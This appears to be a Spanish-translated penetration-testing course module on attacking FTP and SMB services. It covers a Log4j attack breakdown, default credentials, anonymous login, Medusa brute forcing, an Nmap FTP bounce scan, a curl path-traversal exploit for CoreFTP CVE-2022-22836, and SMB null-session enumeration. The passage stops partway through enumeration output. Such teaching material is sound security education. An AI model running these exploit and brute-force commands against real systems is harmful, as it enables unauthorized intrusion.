GovCERT.ch ha creado una excelente representación gráfica de la vulnerabilidad Log4j que vale la pena examinar en detalle.

![](https://academy.hackthebox.com/storage/modules/116/log4jattack.png) Fuente: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

Este gráfico desglosa el ataque Log4j JNDI basado en el `Concept of Attacks`.

#### Iniciación del Ataque

|**Paso**|**Log4j**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|El atacante manipula el agente de usuario con un comando de búsqueda JNDI.|`Source`|
|`2.`|El proceso malinterpreta el agente de usuario asignado, lo que lleva a la ejecución del comando.|`Process`|
|`3.`|El comando de búsqueda JNDI se ejecuta con privilegios de administrador debido a los permisos de registro.|`Privileges`|
|`4.`|Este comando de búsqueda JNDI apunta al servidor creado y preparado por el atacante, que contiene una clase Java maliciosa que contiene comandos diseñados por el atacante.|`Destination`|

Esto es cuando el ciclo comienza de nuevo, pero esta vez para obtener acceso remoto al sistema de destino.

#### Ejecución Remota de Código de Disparador

|**Paso**|**Log4j**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|Después de recuperar la clase Java maliciosa del servidor del atacante, se utiliza como fuente para acciones adicionales en el siguiente proceso.|`Source`|
|`6.`|A continuación, se lee el código malicioso de la clase Java, que en muchos casos ha llevado al acceso remoto al sistema.|`Process`|
|`7.`|El código malicioso se ejecuta con privilegios de administrador debido a los permisos de registro.|`Privileges`|
|`8.`|El código conduce de nuevo a través de la red al atacante con las funciones que permiten al atacante controlar el sistema de forma remota.|`Destination`|

Finalmente, vemos un patrón que podemos usar repetidamente para nuestros ataques. Esta plantilla de patrón se puede utilizar para analizar y comprender exploits y depurar nuestros propios exploits durante el desarrollo y las pruebas. Además, esta plantilla de patrón también se puede aplicar al análisis de código fuente, lo que nos permite verificar ciertas funcionalidades y comandos en nuestro código paso a paso. Finalmente, también podemos pensar categóricamente sobre los peligros de cada tarea individualmente.


# Configuraciones erróneas del servicio

---

Las configuraciones erróneas generalmente ocurren cuando un administrador del sistema, soporte técnico o desarrollador no configura correctamente el marco de seguridad de una aplicación, sitio web, escritorio o servidor, lo que lleva a vías abiertas peligrosas para usuarios no autorizados. Exploremos algunas de las configuraciones erróneas más típicas de los servicios comunes.

---

## Autenticación

En años anteriores (aunque todavía vemos esto a veces durante las evaluaciones), fue generalizado que los servicios incluyeran credenciales predeterminadas (nombre de usuario y contraseña). Esto presenta un problema de seguridad porque muchos administradores dejan las credenciales predeterminadas sin cambios. Hoy en día, la mayoría del software les pide a los usuarios que configuren las credenciales en la instalación, lo cual es mejor que las credenciales predeterminadas. Sin embargo, tenga en cuenta que aún encontraremos proveedores que utilicen credenciales predeterminadas, especialmente en aplicaciones más antiguas.

Incluso cuando el servicio no tiene un conjunto de credenciales predeterminadas, un administrador puede usar contraseñas débiles o ninguna contraseña al configurar los servicios con la idea de que cambiarán la contraseña una vez que el servicio esté configurado y en ejecución.

Como administradores, necesitamos definir políticas de contraseñas que se apliquen al software probado o instalado en nuestro entorno. Se debe exigir a los administradores que cumplan con una complejidad mínima de contraseña para evitar combinaciones de usuarios y contraseñas como:

  Configuraciones erróneas del servicio

```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

Una vez que tomemos el banner de servicio, el siguiente paso debe ser identificar posibles credenciales predeterminadas. Si no hay credenciales predeterminadas, podemos probar las combinaciones débiles de nombre de usuario y contraseña enumeradas anteriormente.

#### Autenticación Anónima

Otra configuración errónea que puede existir en los servicios comunes es la autenticación anónima. El servicio se puede configurar para permitir la autenticación anónima, permitiendo a cualquier persona con conectividad de red al servicio sin que se le solicite la autenticación.

#### Derechos de Acceso Mal Configurados

Imaginemos que recuperamos credenciales para un usuario cuya función es cargar archivos en el servidor FTP, pero se le dio el derecho de leer todos los documentos FTP. La posibilidad es interminable, dependiendo de lo que esté dentro del servidor FTP. Podemos encontrar archivos con información de configuración para otros servicios, credenciales de texto sin formato, nombres de usuario, información de propiedad e información de identificación personal (PII).

Los derechos de acceso mal configurados son cuando las cuentas de usuario tienen permisos incorrectos. El problema más grande podría ser dar a las personas más abajo en la cadena de mando acceso a información privada que solo los gerentes o administradores deberían tener.

Los administradores deben planificar su estrategia de derechos de acceso, y existen algunas alternativas como [Control de acceso basado en roles (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), [Listas de control de acceso (ACL)](https://en.wikipedia.org/wiki/Access-control_list). Si queremos pros y contras más detallados de cada método, podemos leer [Elegir la mejor estrategia de control de acceso](https://authress.io/knowledge-base/role-based-access-control-rbac) por Warren Parad de Authress.

---

## Inconvenientes Innecesarios

La configuración inicial de dispositivos y software puede incluir, entre otros, configuraciones, características, archivos y credenciales. Esos valores predeterminados generalmente están dirigidos a la usabilidad en lugar de a la seguridad. Dejarlo por defecto no es una buena práctica de seguridad para un entorno de producción. Los valores predeterminados innecesarios son aquellas configuraciones que debemos cambiar para asegurar un sistema al reducir su superficie de ataque.

También podríamos entregar la información personal de nuestra empresa en bandeja de plata si tomamos el camino fácil y aceptamos la configuración predeterminada mientras configuramos el software o un dispositivo por primera vez. En realidad, los atacantes pueden obtener credenciales de acceso para equipos específicos o abusar de una configuración débil realizando una breve búsqueda en Internet.

[Seguridad Desconfiguración](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) son parte de la [OWASP Top 10 lista](https://owasp.org/Top10/). Echemos un vistazo a los relacionados con los valores predeterminados:

- Las funciones innecesarias están habilitadas o instaladas (por ejemplo, puertos, servicios, páginas, cuentas o privilegios innecesarios).
- Las cuentas predeterminadas y sus contraseñas aún están habilitadas y sin cambios.
- El manejo de errores revela rastros de pila u otros mensajes de error demasiado informativos para los usuarios.
- Para sistemas actualizados, las últimas características de seguridad están deshabilitadas o no están configuradas de forma segura.

---

## Prevención de la configuración incorrecta

Una vez que hemos descubierto nuestro entorno, la estrategia más sencilla para controlar el riesgo es bloquear la infraestructura más crítica y solo permitir el comportamiento deseado. Cualquier comunicación que no sea requerida por el programa debe estar deshabilitada. Esto puede incluir cosas como:

- Las interfaces de administración deben estar deshabilitadas.
- La depuración está desactivada.
- Deshabilite el uso de nombres de usuario y contraseñas predeterminados.
- Configure el servidor para evitar el acceso no autorizado, la lista de directorios y otros problemas.
- Ejecute escaneos y auditorías regularmente para ayudar a descubrir futuras configuraciones erróneas o correcciones faltantes.

El OWASP Top 10 proporciona una sección sobre cómo asegurar los procesos de instalación:

- Un proceso de endurecimiento repetible hace que sea rápido y fácil implementar otro entorno que esté bloqueado adecuadamente. Los entornos de desarrollo, QA y producción deben configurarse de manera idéntica, con diferentes credenciales utilizadas en cada entorno. Además, este proceso debe automatizarse para minimizar el esfuerzo requerido para configurar un nuevo entorno seguro.
    
- Una plataforma mínima sin características innecesarias, componentes, documentación y muestras. Elimine o no instale características y marcos no utilizados.
    
- Una tarea para revisar y actualizar las configuraciones apropiadas para todas las notas de seguridad, actualizaciones y parches como parte del proceso de administración de parches (consulte A06:2021-Vulnerable and Outdated Components). Revise los permisos de almacenamiento en la nube (por ejemplo, permisos de cubo S3).
    
- Una arquitectura de aplicación segmentada proporciona una separación efectiva y segura entre componentes o inquilinos, con segmentación, contenedorización o grupos de seguridad en la nube (ACL).
    
- Enviar directivas de seguridad a clientes, por ejemplo, encabezados de seguridad.
    
- Un proceso automatizado para verificar la efectividad de las configuraciones y configuraciones en todos los entornos.


# Encontrar Información Sensible

---

Al atacar un servicio, generalmente desempeñamos un papel de detective, y necesitamos recopilar tanta información como sea posible y observar cuidadosamente los detalles. Por lo tanto, cada pieza de información es esencial.

Imaginemos que estamos en un compromiso con un cliente, nos dirigimos a correo electrónico, FTP, bases de datos y almacenamiento, y nuestro objetivo es obtener la Ejecución Remota de Código (RCE) en cualquiera de estos servicios. Comenzamos la enumeración y probamos el acceso anónimo a todos los servicios, y solo FTP tiene acceso anónimo. Encontramos un archivo vacío dentro del servicio FTP, pero con el nombre `johnsmith`, lo intentamos `johnsmith` como usuario FTP y contraseña, pero no funcionó. Intentamos lo mismo con el servicio de correo electrónico e iniciamos sesión con éxito. Con el acceso al correo electrónico, comenzamos a buscar correos electrónicos que contengan la palabra `password`, encontramos muchos, pero uno de ellos contiene las credenciales de John para la base de datos MSSQL. Accedemos a la base de datos y utilizamos la funcionalidad incorporada para ejecutar comandos y obtener RCE con éxito en el servidor de la base de datos. Cumplimos con éxito nuestro objetivo.

Un servicio mal configurado nos permite acceder a una información que inicialmente puede parecer insignificante `johnsmith`, pero esa información nos abrió las puertas para descubrir más información y finalmente obtener la ejecución remota de código en el servidor de la base de datos. Esta es la importancia de prestar atención a cada pieza de información, cada detalle, a medida que enumeramos y atacamos los servicios comunes.

La información sensible puede incluir, pero no se limita a:

- Nombres de usuario.
- Direcciones de Correo Electrónico.
- Contraseñas.
- registros DNS.
- direcciones IP.
- Código fuente.
- Archivos de configuración.
- PII.

Este módulo cubrirá algunos servicios comunes donde podemos encontrar información interesante y descubrir diferentes métodos y herramientas que podemos utilizar para automatizar nuestro proceso de descubrimiento. Estos servicios incluyen:

- Acciones de Archivo.
- Correo electrónico.
- Bases de datos.

---

#### Comprensión de Lo Que Tenemos que Buscar

Cada objetivo es único, y necesitamos familiarizarnos con nuestro objetivo, sus procesos, procedimientos, modelo de negocio y propósito. Una vez que entendemos nuestro objetivo, podemos pensar qué información es esencial para ellos y qué tipo de información es útil para nuestro ataque.

Hay dos elementos clave para encontrar información sensible:

1. Necesitamos entender el servicio y cómo funciona.
2. Necesitamos saber lo que estamos buscando.


# Atacar FTP

---

El [Protocolo de Transferencia de Archivos](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) es un protocolo de red estándar utilizado para transferir archivos entre computadoras. También realiza operaciones de directorio y archivos, como cambiar el directorio de trabajo, enumerar archivos y cambiar el nombre y eliminar directorios o archivos. De forma predeterminada, FTP escucha en el puerto `TCP/21`.

Para atacar un servidor FTP, podemos abusar de la configuración incorrecta o privilegios excesivos, explotar vulnerabilidades conocidas o descubrir nuevas vulnerabilidades. Por lo tanto, después de obtener acceso al Servicio FTP, debemos conocer el contenido del directorio para poder buscar información sensible o crítica, como discutimos anteriormente. El protocolo está diseñado para activar descargas y cargas con comandos. Por lo tanto, los archivos se pueden transferir entre servidores y clientes. Un sistema de gestión de archivos está disponible para el usuario, conocido por el sistema operativo. Los archivos se pueden almacenar en carpetas, que pueden estar ubicadas en otras carpetas. Esto da como resultado una estructura de directorio jerárquica. La mayoría de las empresas utilizan este servicio para procesos de desarrollo de software o sitios web.

---

## Enumeración

`Nmap` scripts predeterminados `-sC` incluye el [ftp-anón](https://nmap.org/nsedoc/scripts/ftp-anon.html) Script Nmap que comprueba si un servidor FTP permite inicios de sesión anónimos. La bandera de enumeración de versiones `-sV` proporciona información interesante sobre los servicios FTP, como el banner FTP, que a menudo incluye el nombre de la versión. Podemos usar el `ftp` cliente o `nc` para interactuar con el servicio FTP. De forma predeterminada, FTP se ejecuta en el puerto TCP 21.

#### Mapa

  Atacar FTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

---

## Configuraciones erróneas

Como discutimos, la autenticación anónima se puede configurar para diferentes servicios como FTP. Para acceder con inicio de sesión anónimo, podemos utilizar el `anonymous` nombre de usuario y sin contraseña. Esto será peligroso para la empresa si los permisos de lectura y escritura no se han configurado correctamente para el servicio FTP. Porque con el inicio de sesión anónimo, la empresa podría haber almacenado información confidencial en una carpeta a la que el usuario anónimo del servicio FTP podría tener acceso.

Esto nos permitiría descargar esta información confidencial o incluso cargar scripts peligrosos. Utilizando otras vulnerabilidades, como el salto de ruta en una aplicación web, podríamos averiguar dónde se encuentra este archivo y ejecutarlo como código PHP, por ejemplo.

#### Autenticación Anónima

  Atacar FTP

```shell-session
vcrdcr@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Una vez que tengamos acceso a un servidor FTP con credenciales anónimas, podemos comenzar a buscar información interesante. Podemos usar los comandos `ls` y `cd` para moverse por directorios como en Linux. Para descargar un solo archivo, utilizamos `get`, y para descargar múltiples archivos, podemos usar `mget`. Para operaciones de carga, podemos usar `put` para un archivo simple o `mput` para múltiples archivos. Podemos usar `help` en la sesión de cliente FTP para más información.

En el [Huella](https://academy.hackthebox.com/course/preview/footprinting) módulo, cubrimos información detallada sobre posibles configuraciones erróneas de dichos servicios. Por ejemplo, se pueden aplicar muchas configuraciones diferentes a un servidor FTP, y algunas de ellas conducen a diferentes opciones que podrían causar posibles ataques contra ese servicio. Sin embargo, este módulo se centrará en ataques específicos en lugar de encontrar configuraciones erróneas individuales.

---

## Ataques Específicos de Protocolo

Muchos ataques y métodos diferentes están basados en protocolos. Sin embargo, es esencial tener en cuenta que no estamos atacando los protocolos individuales en sí, sino los servicios que los utilizan. Dado que hay docenas de servicios para un solo protocolo y procesan la información correspondiente de manera diferente, veremos algunos.

#### Forzamiento Bruto

Si no hay una autenticación anónima disponible, también podemos forzar el inicio de sesión de los servicios FTP utilizando una lista de los nombres de usuario y contraseñas pregenerados. Hay muchas herramientas diferentes para realizar un ataque de fuerza bruta. Exploremos uno de ellos, [Medusa](https://github.com/jmk-foofus/medusa). Con `Medusa`, podemos usar la opción `-u` para especificar un solo usuario para apuntar, o puede usar la opción `-U` para proporcionar un archivo con una lista de nombres de usuario. La opción `-P` es para un archivo que contiene una lista de contraseñas. Podemos usar la opción `-M` y el protocolo al que nos dirigimos (FTP) y la opción `-h` para el nombre de host de destino o la dirección IP.

**Nota:** Aunque podemos encontrar servicios vulnerables a la fuerza bruta, la mayoría de las aplicaciones de hoy en día previenen este tipo de ataques. Un método más efectivo es la pulverización con contraseña.

#### Forzamiento Bruto con Medusa

  Atacar FTP

```shell-session
vcrdcr@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

#### ataque de rebote FTP

Un ataque de rebote FTP es un ataque de red que utiliza servidores FTP para entregar tráfico saliente a otro dispositivo en la red. El atacante usa un `PORT` comando para engañar a la conexión FTP para que ejecute comandos y obtenga información de un dispositivo que no sea el servidor previsto.

Considere que estamos apuntando a un servidor FTP `FTP_DMZ` expuesto a internet. Otro dispositivo dentro de la misma red, `Internal_DMZ`, no está expuesto a Internet. Podemos usar la conexión con el `FTP_DMZ` servidor para escanear `Internal_DMZ` usando el ataque de rebote FTP y obtener información sobre los puertos abiertos del servidor. Entonces, podemos usar esa información como parte de nuestro ataque contra la infraestructura.

![texto](https://academy.hackthebox.com/storage/modules/116/ftp_bounce_attack.png) Fuente: [https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)

El `Nmap` la bandera -B se puede utilizar para realizar un ataque de rebote FTP:

  Atacar FTP

```shell-session
vcrdcr@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

Los servidores FTP modernos incluyen protecciones que, de forma predeterminada, evitan este tipo de ataque, pero si estas características están mal configuradas en los servidores FTP modernos, el servidor puede volverse vulnerable a un ataque de rebote FTP.

Cuando genere su objetivo, espere hasta 60 segundos más después de ver la dirección IP para asegurarse de que el servicio correspondiente se inicie correctamente.


# Últimas Vulnerabilidades FTP

---

Al discutir las últimas vulnerabilidades, enfocaremos esta sección y las siguientes en uno de los ataques mostrados anteriormente y lo presentaremos de la manera más sencilla posible sin entrar en demasiados detalles técnicos. Esto debería ayudarnos a facilitar el concepto del ataque a través de un ejemplo relacionado con un servicio específico para obtener una mejor comprensión.

En este caso, discutiremos el `CoreFTP before build 727` vulnerabilidad asignada [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). Esta vulnerabilidad es para un servicio FTP que no procesa correctamente el `HTTP PUT` solicitud y conduce a un `authenticated directory`/`path traversal,` y `arbitrary file write` vulnerabilidad. Esta vulnerabilidad nos permite escribir archivos fuera del directorio al que tiene acceso el servicio.

---

## El Concepto del Ataque

Este servicio FTP utiliza un HTTP `POST` solicitar cargar archivos. Sin embargo, el servicio CoreFTP permite un HTTP `PUT` solicitud, que podemos usar para escribir contenido en archivos. Echemos un vistazo al ataque basado en nuestro concepto. El [explotar](https://www.exploit-db.com/exploits/50652) para este ataque es relativamente sencillo, basado en un solo `cURL` comando.

#### Explotación CoreFTP

  Últimas Vulnerabilidades FTP

```shell-session
vcrdcr@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Creamos un HTTP sin procesar `PUT` solicitud (`-X PUT`) con autenticación básica (`--basic -u <username>:<password>`), la ruta para el archivo (`--path-as-is https://<IP>/../../../../../whoops`), y su contenido (`--data-binary "PoC."`) con este comando. Además, especificamos el encabezado del host (`-H "Host: <IP>"`) con la dirección IP de nuestro sistema de destino.

#### El Concepto de Ataques

![](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

En resumen, el proceso real malinterpreta la entrada del usuario de la ruta. Esto conduce a que se omita el acceso a la carpeta restringida. Como resultado, los permisos de escritura en el HTTP `PUT` las solicitudes no están adecuadamente controladas, lo que nos lleva a poder crear los archivos que queremos fuera de las carpetas autorizadas. Sin embargo, omitiremos la explicación de la `Basic Auth` procesa y salta directamente a la primera parte del exploit.

#### Directorio Traversal

|**Paso**|**Directorio Traversal**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`1.`|El usuario especifica el tipo de petición HTTP con el contenido del archivo, incluyendo caracteres de escape para salir del área restringida.|`Source`|
|`2.`|El tipo modificado de solicitud HTTP, el contenido del archivo y la ruta ingresada por el usuario son asumidos y procesados por el proceso.|`Process`|
|`3.`|La aplicación comprueba si el usuario está autorizado a estar en la ruta especificada. Dado que las restricciones solo se aplican a una carpeta específica, todos los permisos que se le otorgan se omiten a medida que sale de esa carpeta utilizando el salto de directorio.|`Privileges`|
|`4.`|El destino es otro proceso que tiene la tarea de escribir los contenidos especificados del usuario en el sistema local.|`Destination`|

Hasta este punto, hemos pasado por alto las restricciones impuestas por la aplicación utilizando los caracteres de escape (`../../../../`) y llegar a la segunda parte, donde el proceso escribe los contenidos que especificamos en un archivo de nuestra elección. Esto es cuando el ciclo comienza de nuevo, pero esta vez para escribir contenido en el sistema de destino.

#### Archivo Arbitrario Escribir

|**Paso**|**Archivo Arbitrario Escribir**|**Concepto de Ataques - Categoría**|
|---|---|---|
|`5.`|La misma información que el usuario ingresó se usa como fuente. En este caso, el nombre del archivo (`whoops`) y el contenido (`--data-binary "PoC."`).|`Source`|
|`6.`|El proceso toma la información especificada y procede a escribir el contenido deseado en el archivo especificado.|`Process`|
|`7.`|Dado que todas las restricciones se omitieron durante la vulnerabilidad de salto de directorio, el servicio aprueba escribir el contenido en el archivo especificado.|`Privileges`|
|`8.`|El nombre de archivo especificado por el usuario (`whoops`) con el contenido deseado (`"PoC."`) ahora sirve como el destino en el sistema local.|`Destination`|

Una vez completada la tarea, podremos encontrar este archivo con los contenidos correspondientes en el sistema de destino.

#### Sistema Objetivo

  Últimas Vulnerabilidades FTP

```cmd-session
C:\> type C:\whoops

PoC.
```


# Atacar a SMB

---

Server Message Block (SMB) es un protocolo de comunicación creado para proporcionar acceso compartido a archivos e impresoras a través de nodos en una red. Inicialmente, fue diseñado para ejecutarse encima de NetBIOS sobre TCP/IP (NBT) utilizando el puerto TCP `139` y puertos UDP `137` y `138`. Sin embargo, con Windows 2000, Microsoft agregó la opción de ejecutar SMB directamente sobre TCP/IP en el puerto `445` sin la capa adicional de NetBIOS. Hoy en día, los sistemas operativos modernos de Windows utilizan SMB sobre TCP, pero aún admiten la implementación de NetBIOS como una conmutación por error.

Samba es una implementación de código abierto basada en Unix/Linux del protocolo SMB. También permite que los servidores Linux/Unix y los clientes de Windows utilicen los mismos servicios SMB.

Por ejemplo, en Windows, SMB puede ejecutarse directamente a través del puerto 445 TCP/IP sin la necesidad de NetBIOS a través de TCP/IP, pero si Windows tiene NetBIOS habilitado, o si estamos apuntando a un host que no es de Windows, encontraremos SMB ejecutándose en el puerto 139 TCP/IP. Esto significa que SMB se está ejecutando con NetBIOS a través de TCP/IP.

Otro protocolo que comúnmente está relacionado con SMB es [MSRPC (Llamada de Procedimiento Remoto de Microsoft)](https://en.wikipedia.org/wiki/Microsoft_RPC). RPC proporciona a un desarrollador de aplicaciones una forma genérica de ejecutar un procedimiento (a.k.a. una función) en un proceso local o remoto sin tener que comprender los protocolos de red utilizados para admitir la comunicación, como se especifica en [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), que define un RPC sobre el Protocolo SMB que puede usar el Protocolo SMB llamado tuberías como su transporte subyacente.

Para atacar un servidor SMB, necesitamos entender su implementación, sistema operativo y qué herramientas podemos usar para abusar de él. Al igual que con otros servicios, podemos abusar de la configuración incorrecta o privilegios excesivos, explotar vulnerabilidades conocidas o descubrir nuevas vulnerabilidades. Además, después de obtener acceso al Servicio SMB, si interactuamos con una carpeta compartida, debemos conocer el contenido del directorio. Finalmente, si estamos apuntando a NetBIOS o RPC, identifique qué información podemos obtener o qué acción podemos realizar en el objetivo.

---

## Enumeración

Dependiendo de la implementación de SMB y el sistema operativo, obtendremos información diferente utilizando `Nmap`. Tenga en cuenta que al apuntar al sistema operativo Windows, la información de la versión generalmente no se incluye como parte de los resultados del escaneo Nmap. En cambio, Nmap intentará adivinar la versión OS. Sin embargo, a menudo necesitaremos otros escaneos para identificar si el objetivo es vulnerable a un exploit en particular. Cubriremos la búsqueda de vulnerabilidades conocidas más adelante en esta sección. Por ahora, escaneemos los puertos 139 y 445 TCP.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

El escaneo Nmap revela información esencial sobre el objetivo:

- Versión SMB (Samba smbd 4.6.2)
- Nombre del host HTB
- El sistema operativo es Linux basado en la implementación de SMB

Exploremos algunas configuraciones erróneas comunes y ataques específicos de protocolos.

---

## Configuraciones erróneas

SMB se puede configurar para no requerir autenticación, lo que a menudo se denomina a `null session`. En su lugar, podemos iniciar sesión en un sistema sin nombre de usuario ni contraseña.

#### Autenticación Anónima

Si encontramos un servidor SMB que no requiere un nombre de usuario y contraseña o encontramos credenciales válidas, podemos obtener una lista de acciones, nombres de usuario, grupos, permisos, políticas, servicios, etc. La mayoría de las herramientas que interactúan con SMB permiten conectividad de sesión nula, incluyendo `smbclient`, `smbmap`, `rpcclient`, o `enum4linux`. Exploremos cómo podemos interactuar con recursos compartidos de archivos y RPC utilizando la autenticación nula.

#### Archivo Compartir

Usando `smbclient`, podemos mostrar una lista de las acciones del servidor con la opción `-L`, y usando la opción `-N`, lo decimos `smbclient` para usar la sesión nula.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` es otra herramienta que nos ayuda a enumerar los recursos compartidos de red y acceder a los permisos asociados. Una ventaja de `smbmap` es que proporciona una lista de permisos para cada carpeta compartida.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Usando `smbmap` con el `-r` o `-R` (recursiva) opción, uno puede navegar por los directorios:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

En el ejemplo anterior, los permisos se establecen en `READ` y `WRITE`, que se puede utilizar para cargar y descargar los archivos.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

#### Llamada de Procedimiento Remoto (RPC)

Podemos usar el `rpcclient` herramienta con una sesión nula para enumerar una estación de trabajo o Controlador de dominio.

El `rpcclient` tool nos ofrece muchos comandos diferentes para ejecutar funciones específicas en el servidor SMB para recopilar información o modificar atributos del servidor como un nombre de usuario. Podemos usar esto [hoja de trucos del Instituto SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) o revise la lista completa de todas estas funciones que se encuentran en el [página de manual](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) de la `rpcclient`.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` es otra utilidad que admite sesiones nulas, y utiliza `nmblookup`, `net`, `rpcclient`, y `smbclient` para automatizar alguna enumeración común de objetivos de SMB como:

- Grupo de trabajo/Nombre del dominio
- Información de los usuarios
- Información del sistema operativo
- Información de grupos
- Acciones Carpetas
- Información de política de contraseña

El [herramienta original](https://github.com/CiscoCXSecurity/enum4linux) fue escrito en Perl y [reescrito por Mark Lowe en Python](https://github.com/cddmp/enum4linux-ng).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
